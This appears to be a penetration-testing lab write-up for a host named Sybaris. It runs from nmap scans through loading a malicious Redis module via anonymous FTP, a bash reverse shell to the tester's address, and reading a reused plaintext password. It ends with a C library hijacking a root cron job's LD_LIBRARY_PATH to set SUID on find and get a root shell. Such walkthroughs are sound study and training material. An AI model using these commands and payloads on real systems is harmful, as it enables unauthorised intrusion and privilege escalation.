## NMAP
```
sudo nmap -sC -sV -p- 192.168.68.93                                                                  
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-18 11:55 CDT
Nmap scan report for 192.168.68.93
Host is up (0.044s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp       vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
22/tcp    open   ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2194ded36964a84da8f0b50aeabd02ad (RSA)
|   256 674245198bf5f9a5a4cffb8748a266d0 (ECDSA)
|_  256 f3e229a3411e761eb1b746dc0bb99177 (ED25519)
53/tcp    closed domain
80/tcp    open   http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
|_http-generator: HTMLy v2.7.5
|_http-title: Sybaris - Just another HTMLy blog
6379/tcp  open   redis     Redis key-value store 5.0.9
10091/tcp closed unknown
10092/tcp closed unknown
10093/tcp closed unknown
10094/tcp closed unknown
10095/tcp closed unknown
10096/tcp closed unknown
10097/tcp closed unknown
10098/tcp closed unknown
10099/tcp closed unknown
10100/tcp closed itap-ddtp
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.15 seconds
                                                                                                                     
┌──(kali㉿kali)-[~/OPG]
└─$ nmap --script redis-info -sV -p 6379 192.168.68.93                                                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-18 12:06 CDT
Nmap scan report for 192.168.68.93
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.9 (64 bits)
| redis-info: 
|   Version: 5.0.9
|   Operating System: Linux 3.10.0-1127.19.1.el7.x86_64 x86_64
|   Architecture: 64 bits
|   Process ID: 909
|   Used CPU (sys): 2.468947
|   Used CPU (user): 1.900090
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 562.22K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.49.68

```

Logged into FTP we have a blank ftp pub directory. It is likely we can use this later for some kindof file upload. I see we have a redis server. We can login to Redis using redis-cli -h IP

Logging in, we have no need for credentials. I was able to find this below.
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module

I compiled the file on my system and upload using FTP.

Once uploaded, I loaded the module by running the following:
```sh
redis-cli -h 192.168.165.93
192.168.165.93:6379> set working dir /var/ftp
(error) ERR syntax error
192.168.165.93:6379> set working dir /etc/ftp
(error) ERR syntax error
192.168.165.93:6379> module load /var/ftp/pub/module.so
OK
192.168.165.93:6379> module list
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
192.168.165.93:6379> system.exec "whoami"
"pablo\n"
192.168.165.93:6379> 
```

I now have remote commands that I can run.

`sh -i >& /dev/tcp/192.168.49.68/21 0>&1`

Interesting things I found in linpeas
```
Vulnerable to CVE-2021-4034

/usr/bin/lesspipe.sh                                                                                                
/usr/bin/gettext.sh
/usr/bin/setup-nsssysinit.sh

/var/www/html/config/users/pablo.ini
/var/log/redis

```

Found pablo.ini to have this:
```
sh-4.2$ cat pablo.ini
cat pablo.ini
password = PostureAlienateArson345
role = admin
```
He re-used his password so we have ssh access outside of redis.

Looking over linpeas again, I was able to see a cron job:
```sh
/var/spool/anacron:
total 12
drwxr-xr-x. 2 root root 63 Sep  4  2020 .
drwxr-xr-x. 8 root root 87 Sep  4  2020 ..
-rw-------. 1 root root  9 Jan 23 05:26 cron.daily
-rw-------. 1 root root  9 Mar 26 19:41 cron.monthly
-rw-------. 1 root root  9 Mar 26 19:41 cron.weekly
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""


  *  *  *  *  * root       /usr/bin/log-sweeper
```

Running log-sweeper we get the following:
`/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory`

We need to use the LD_LIBRARY path and find a writeable location. 

I was able to find the following as writeable:
`/usr/local/lib/dev`

I located the following code and set it up to send a response back once completed.

```utils.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

static void sybaris() __attribute__((constructor));
void sybaris() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("chmod +s /usr/bin/find");
	system("ping 192.168.49.68 -c 2");
}
```

Started tcpdump on the tun0 and waited to see the response. Here is what I recieved after running below.

```tcpdump
21:53:43.427158 IP 192.168.68.93 > 192.168.49.68: ICMP echo request, id 27450
21:53:43.427175 IP 192.168.49.68 > 192.168.68.93: ICMP echo reply, id 27450, 
21:53:44.328011 IP 192.168.68.93 > 192.168.49.68: ICMP echo request, id 27450
21:53:44.328023 IP 192.168.49.68 > 192.168.68.93: ICMP echo reply, id 27450,
```

Compiled before uploading:

`gcc --shared -o utils.so -fPIC utils.c`

Started a python webserver to wget it to the target.

```
[pablo@sybaris dev]$ wget http://192.168.49.68/utils.so
--2023-03-26 22:50:43--  http://192.168.49.68/utils.so
Connecting to 192.168.49.68:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15488 (15K) [application/octet-stream]
Saving to: ‘utils.so’

100%[========================================================================

2023-03-26 22:50:44 (285 KB/s) - ‘utils.so’ saved [15488/15488]

[pablo@sybaris dev]$ ls
utils.so
[pablo@sybaris dev]$ /usr/bin/log-sweeper
/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot r directory
[pablo@sybaris dev]$ /usr/bin/log-sweeper
/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot r directory
[pablo@sybaris dev]$ ls -la /usr/bin/find
-rwsr-sr-x. 1 root root 199304 Oct 30  2018 /usr/bin/find
[pablo@sybaris dev]$ /usr/bin/find . -exec /bin/sh -p \; -quit
sh-4.2# whoami
root
sh-4.2# cd /root
sh-4.2# ls
proof.txt
sh-4.2# cat proof.txt
```